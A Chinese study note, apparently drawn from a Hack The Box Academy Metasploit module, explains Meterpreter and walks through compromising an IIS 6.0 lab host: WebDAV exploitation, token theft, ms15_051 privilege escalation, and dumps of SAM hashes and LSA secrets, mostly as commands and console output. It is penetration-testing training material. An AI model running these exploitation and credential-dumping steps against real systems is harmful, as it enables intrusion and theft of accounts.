msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

当我们想在已经利用的系统上运行额外的模块，并且已经形成稳定的通信通道时，这特别有用。

这可以通过将当前会话（由于第一个漏洞利用成功而形成）置于后台、搜索我们希望运行的第二个模块，以及（如果所选模块类型允许的话）选择应该运行该模块的会话编号来完成。这可以从第二个模块的 `show options` 菜单中完成。

通常，这些模块可以在 `post` 类别中找到，指的是后渗透（Post-Exploitation）模块。此类别中模块的主要原型包括凭据收集器、本地漏洞利用建议器和内部网络扫描器。

---

## 作业（Jobs）

例如，如果我们正在特定端口下运行一个活动的漏洞利用，并且需要将此端口用于不同的模块，我们不能简单地使用 `[CTRL] + [C]` 终止会话。如果我们这样做，会发现该端口仍在使用中，影响我们使用新模块。因此，我们需要使用 `jobs` 命令查看当前在后台运行的活动任务，并终止旧任务以释放端口。

会话中的其他类型的任务也可以转换为作业，以便在后台无缝运行，即使会话终止或消失也是如此。

#### 查看 Jobs 命令帮助菜单

我们可以像其他命令一样，通过输入 `jobs -h` 来查看此命令的帮助菜单。

Viewing the Jobs Command Help Menu

```shell-session
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### 查看 Exploit 命令帮助菜单

当我们运行漏洞利用时，可以通过输入 `exploit -j` 将其作为作业运行。根据 `exploit` 命令的帮助菜单，在命令中添加 `-j`，而不只是 `exploit` 或 `run`，将"在作业上下文中运行它"。

Viewing the Exploit Command Help Menu

```shell-session
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.

<SNIP
```

#### 将漏洞利用作为后台作业运行

Running an Exploit as a Background Job

```shell-session

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### 列出正在运行的作业

要列出所有正在运行的作业，我们可以使用 `jobs -l` 命令。要终止特定作业，查看作业的索引号并使用 `kill [索引号]` 命令。使用 `jobs -K` 命令终止所有正在运行的作业。

Listing Running Jobs

```shell-session

msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

接下来，我们将使用极其强大的 `Meterpreter` 载荷。#metasploit #meterpreter #hacking [source](https://academy.hackthebox.com/module/39/section/414)

`Meterpreter` 载荷是一种特定类型的多功能、可扩展载荷，它使用 `DLL 注入`（DLL injection）来确保与受害主机的连接稳定且难以通过简单检查检测到，并且可以配置为在重启或系统更改后保持持久性。此外，Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，使其难以被传统取证技术检测到。

它被称为渗透测试的瑞士军刀，这是有充分理由的。Meterpreter 的目的是专门改进我们的后渗透程序，为我们提供一套精心挑选的相关工具，以便更直接地从内部枚举目标主机。它可以帮助我们发现各种权限提升技术、AV 规避技术、进一步的漏洞研究、提供持久访问、跳板（pivot）等。

有关一些有趣的阅读材料，请查看这篇关于 Meterpreter 无阶段载荷的[文章](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)以及这篇关于修改 Metasploit 模板以规避检测的[文章](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion)。这些主题超出了本模块的范围，但我们应该了解这些可能性。

---

## 运行 Meterpreter

要运行 Meterpreter，我们只需要从 `show payloads` 输出中选择它的任何版本，同时考虑我们正在攻击的连接类型和操作系统。

当漏洞利用完成时，会发生以下事件：

- 目标执行初始 stager。这通常是 bind、reverse、findtag、passivex 等。

- stager 加载以 Reflective 为前缀的 DLL。Reflective stub（反射存根）处理 DLL 的加载/注入。

- Meterpreter 核心初始化，通过套接字建立 AES 加密链接，并发送 GET 请求。Metasploit 接收此 GET 并配置客户端。

- 最后，Meterpreter 加载扩展。它将始终加载 `stdapi`，如果模块提供管理员权限则加载 `priv`。所有这些扩展都通过 AES 加密加载。
每当 Meterpreter Payload（有效载荷）被发送并在目标系统上运行时，我们会收到一个 `Meterpreter shell`（Meterpreter 交互式命令行）。然后我们可以立即使用 `help` 命令来查看 Meterpreter shell 的功能。

#### MSF - Meterpreter 命令

MSF - Meterpreter Commands

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
```

其中一些命令也可以在模块速查表中找到以供参考。

关于 Meterpreter，我们需要理解的核心概念是：它与直接获取目标操作系统的 shell 一样强大，但功能更多。Meterpreter 的开发者为该项目设定了明确的设计目标，以便在未来大幅提升可用性。Meterpreter 需要具备：

- 隐蔽性（Stealthy）
- 强大功能（Powerful）
- 可扩展性（Extensible）

---

## 隐蔽性

Meterpreter 在启动并到达目标后，完全驻留在内存中，不会向磁盘写入任何内容。它也不会创建新进程，因为 Meterpreter 会将自身注入到已被入侵的进程中。此外，它还可以执行进程迁移（process migration），从一个运行中的进程迁移到另一个进程。

在现已更新的 msfconsole-v6 中，目标主机与我们之间的所有 Meterpreter payload 通信都使用 AES 加密，以确保数据通信的机密性和完整性。

所有这些特性使得留下的取证证据极少，对受害机器的影响也很小。

---

## 强大功能

Meterpreter 在目标主机和攻击者之间使用通道化通信系统（channelized communication system），这一点非常有用。当我们在 Meterpreter 阶段中通过打开专用通道立即生成主机操作系统的 shell 时，可以亲身体验到这一点。这也支持使用 AES 加密流量。

---

## 可扩展性

Meterpreter 的功能可以在运行时不断增强，并通过网络加载。其模块化结构还允许在不重新构建的情况下添加新功能。

---

## 使用 Meterpreter

我们已经在 Payloads 部分深入了解了 Meterpreter 的基础知识。现在，我们将了解 Meterpreter shell 的真正优势，以及它如何提高评估效率并在渗透测试过程中节省时间。我们首先对一个已知目标运行基本扫描。我们将在 msfconsole 内部完成所有操作，以便利用对目标的数据跟踪。

#### MSF - 扫描目标

MSF - Scanning Target

```shell-session
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: | http-webdav-scan:
[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] Nmap: |   WebDAV type: Unknown
[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device


msf6 > services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

接下来，我们查找关于这台机器上运行的服务的一些信息。具体来说，我们想探索 80 端口以及那里托管的是什么类型的 Web 服务。

![](https://academy.hackthebox.com/storage/modules/39/S12_SS01.png)

我们注意到这是一个正在建设中的网站——这里没有什么与 Web 相关的内容可看。然而，仔细观察网页末尾和 Nmap 扫描结果，我们注意到服务器正在运行 `Microsoft IIS httpd 6.0`。因此，我们进一步朝着这个方向研究，搜索这个 IIS 版本的常见漏洞。经过一些搜索，我们发现了以下广泛存在的漏洞标识符：`CVE-2017-7269`。它还有一个为其开发的 Metasploit 模块。

#### MSF - 搜索漏洞利用模块

MSF - Searching for Exploit

```shell-session
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

我们继续设置所需的参数。目前需要设置的是 `LHOST` 和 `RHOST`，因为目标上的其他设置似乎都在使用默认配置。

#### MSF - 配置漏洞利用和 Payload

MSF - Configuring Exploit & Payload

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.14.26:4444
[*] Checking /metasploit28857905.asp
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Deleting /metasploit28857905.asp (this doesn't always work)...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000

meterpreter >
```

我们获得了 Meterpreter shell。然而，仔细看看上面的输出。我们可以看到此刻目标系统上存在一个名为 `metasploit28857905` 的 `.asp` 文件。一旦获得 Meterpreter shell，如前所述，它将驻留在内存中。因此，该文件不再需要，`msfconsole` 尝试删除它，但由于访问权限问题而失败。留下这样的痕迹对攻击者来说是不利的，会造成巨大的风险。

从系统管理员的角度来看，查找与此类名称或其轻微变体匹配的文件对于阻止正在进行的攻击可能非常有用。针对上述文件名或签名的正则表达式匹配可以在攻击者甚至还没有生成 Meterpreter shell 之前就将其拦截，只要安全措施配置正确。

我们继续进行渗透。在尝试查看我们以哪个用户身份运行时，收到了访问被拒绝的消息。我们应该尝试将进程迁移到具有更高权限的用户。

#### MSF - Meterpreter 迁移

MSF - Meterpreter Migration

```shell-session
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 216   1080  cidaemon.exe
 272   4     smss.exe
 292   1080  cidaemon.exe
<...SNIP...>

 1712  396   alg.exe
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

现在我们已经在系统中建立了至少一定级别的权限，是时候进行权限提升了。我们四处查看是否有什么有趣的内容，在 `C:\Inetpub\` 位置，我们发现了一个名为 `AdminScripts` 的有趣文件夹。然而不幸的是，我们没有权限查看其中的内容。

#### MSF - 与目标交互

MSF - Interacting with the Target

```cmd-session
c:\Inetpub>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
09/03/2020  01:10 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,160,448 bytes free


c:\Inetpub>cd AdminScripts

cd AdminScripts
Access is denied.
```

我们可以很容易地决定运行本地漏洞利用建议模块（local exploit suggester module），将其附加到当前活动的 Meterpreter 会话。为此，我们将当前的 Meterpreter 会话置于后台，搜索我们需要的模块，并将 SESSION 选项设置为 Meterpreter 会话的索引号，将模块绑定到它。

#### MSF - 会话处理

MSF - Session Handling

```shell-session
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) >
```

运行侦察模块为我们提供了多种选择。逐一尝试后，我们找到了 `ms15_051_client_copy_image` 条目，它证明是成功的。这个漏洞利用直接让我们进入 root shell，从而完全控制目标系统。

#### MSF - 权限提升

MSF - Privilege Escalation

```shell-session
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

从这里开始，我们可以继续使用 Meterpreter 的众多功能。例如，提取哈希值、模拟任何我们想要的进程等。

#### MSF - 导出哈希值

MSF - Dumping Hashes

```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

RID  : 000003ec (1004)
User : IWAM_GRANPA
  Hash LM  : 95d112c4da2348b599183ac6b1d67840
  Hash NTLM: a97f39734c21b3f6155ded7821d04d16

RID  : 000003ef (1007)
User : ASPNET
  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
  Hash NTLM: edc0d5506804653f58964a2376bbd769

RID  : 000003f1 (1009)
User : Lakis
  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```

#### MSF - Meterpreter LSA 密钥导出

MSF - Meterpreter LSA Secrets Dump

```shell-session
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
cur/hex : 00 f2 d1 31 e2 11 d3 01

Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f
old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16

Secret  : NL$KM
cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f

Secret  : SAC

Secret  : SAI

Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}

Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}

Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService

Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService

Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService

Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService

Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService

Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService

Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
```

从这一点来看，如果这台机器连接到更广泛的网络，我们可以利用这些收获在系统中进行横向移动（pivot），获取对内部资源的访问权限，并在网络整体安全态势较弱的情况下冒充具有更高访问级别的用户。#metasploit #hacking #cheatsheet

[[cheatsheet-metasploit]]
